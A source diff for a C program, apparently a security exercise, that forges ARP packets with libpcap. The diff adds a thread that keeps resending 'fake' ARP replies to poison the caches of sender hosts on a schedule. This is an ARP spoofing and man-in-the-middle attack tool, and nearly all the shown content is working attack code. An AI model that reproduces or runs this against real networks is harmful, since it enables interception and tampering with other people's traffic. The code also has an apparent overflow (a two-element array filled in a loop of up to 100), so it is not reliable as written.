@@ -13,6 +13,8 @@
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <sys/ioctl.h>
+#include <time.h>
+#include <pthread.h>
 
 #define IP_ADDR_LEN 4
 
@@ -26,6 +28,13 @@ struct arp_packet{
 	struct in_addr des_pro_addr;
 };
 #pragma pack(pop)
+
+struct thread_data{
+	pcap_t * _handle;
+	int _num;
+	unsigned int _time_interval;
+	struct arp_packet * _packet[100];
+};
 
 int getMacAddress(uint8_t * my_mac, char * interface)
 {
@@ -170,6 +179,35 @@ void make_arp_packet(	struct arp_packet * packet[],int i, uint8_t ether_dhost[],
         memcpy(&packet[i]->des_pro_addr, des_pro_addr, sizeof(struct in_addr));
 }
 
+void *t_arp_infection(void *th_data)		
+{
+	pcap_t *handle;
+	unsigned int time_interval;
+	int num;
+	struct arp_packet * packet[2];
+	struct thread_data * arg = (struct thread_data *)th_data;
+	
+	handle = arg->_handle;
+	time_interval = arg->_time_interval;
+	num = arg ->_num;
+	for(int i=0;i<num;i++){
+		packet[i] = arg->_packet[i];
+	}
+	
+	while(1)
+	{	
+		for(int i=0;i<num;i++){
+			printf("fake arp packet #%d send",i);
+			if(pcap_sendpacket(handle, (unsigned char *)packet[i], sizeof(arp_packet)))    
+        		{
+                		fprintf(stderr, "\nError sending the packet\n");
+	                	exit(0);
+        		}
+		}
+		sleep(time_interval);
+	}
+}
+
 int main(int argc, char* argv[])
 {	
 	pcap_t *handle;
@@ -181,8 +219,8 @@ int main(int argc, char* argv[])
 		return -1;
 	}
 	
-	int s_num = (argc-2)/2;
-	printf("%d",s_num);	
+	static int s_num = (argc-2)/2;
+	printf("Session num : %d\n",s_num);	
 
 	uint8_t my_mac[ETHER_ADDR_LEN];
 	uint8_t sender_mac[s_num][ETHER_ADDR_LEN];
@@ -195,6 +233,15 @@ int main(int argc, char* argv[])
 	uint16_t arp_hrd_type = ARPHRD_ETHER;
 	uint16_t arp_pro_type =ETHERTYPE_IP;
 	uint16_t arp_opcode = ARPOP_REQUEST;
+
+	unsigned int time_interval;
+	struct thread_data th_data;	
+	pthread_t infect_th;
+	int thr_id;
+	int status;
+
+	printf("Please enter time interval : ");	
+	scanf("%d", &time_interval);
 
 	//get attacker mac ip
 	getMacAddress(my_mac, argv[1]);
@@ -263,7 +310,7 @@ int main(int argc, char* argv[])
 			{
 				printf("Broadcast done\n");
 				memcpy(sender_mac[i], src_hrd_addr, ETHER_ADDR_LEN);
-				printf("Sender mac %d : \n",i);
+				printf("Sender mac %d : ",i);
 				print_mac(sender_mac[i]);
 				break;
 			}
@@ -278,7 +325,23 @@ int main(int argc, char* argv[])
 				IP_ADDR_LEN, arp_opcode, my_mac, target_ip[i], sender_mac[i], sender_ip[i]);
 		print_packet(fake_packet,i);
 	}
+
+	th_data._handle = handle;
+	th_data._time_interval = time_interval;
+	for (int i=0; i<s_num;i++){
+		th_data._packet[i]=fake_packet[i];
+	}
+	th_data._num = s_num;
+	
+	thr_id = pthread_create(&infect_th, NULL, t_arp_infection, (void *)&th_data);	// infection thread
+        if (thr_id < 0)
+        {
+                perror("thread create error : ");
+                exit(0);
+        }
+	pthread_join(infect_th,(void**)&status);
 	/*
+
 	while(true){
 		//send arp reply packet
         	if(pcap_sendpacket(handle, (unsigned char *)fake_packet, sizeof(arp_packet)))
